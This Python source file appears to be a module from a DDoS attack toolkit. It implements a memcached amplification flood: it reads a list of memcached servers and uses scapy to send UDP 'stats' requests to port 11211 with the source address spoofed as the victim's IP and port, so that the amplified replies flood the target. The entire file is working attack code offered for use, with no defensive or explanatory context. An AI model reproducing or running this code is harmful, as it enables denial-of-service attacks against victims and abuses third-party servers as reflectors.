# Import modules
import random
from rich.console import Console
from bin.addons.utils import __path
from scapy.all import IP, UDP, send, Raw

# Define styled print
print = Console().print
red = "red3"
green = "green1"
yellow = "yellow1"

# Load MEMCACHED servers list
with open(__path("bin", "config", "memcached_servers.txt"), "r") as f:
    memcached_servers = f.readlines()

# Payload
payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"


def flood(target):
    server = random.choice(memcached_servers)
    packets = random.randint(10, 150)
    server = server.replace("\n", "")
    # Packet
    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=target[1], dport=11211)
            / Raw(load=payload)
        )
        send(packet, count=packets, verbose=False)
    except Exception as e:
        print(f"[{red}]Error while sending forged UDP packet\n{e}[/{red}]")
    else:
        print(
            f"[{green}][+] [{yellow}]Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}"
        )
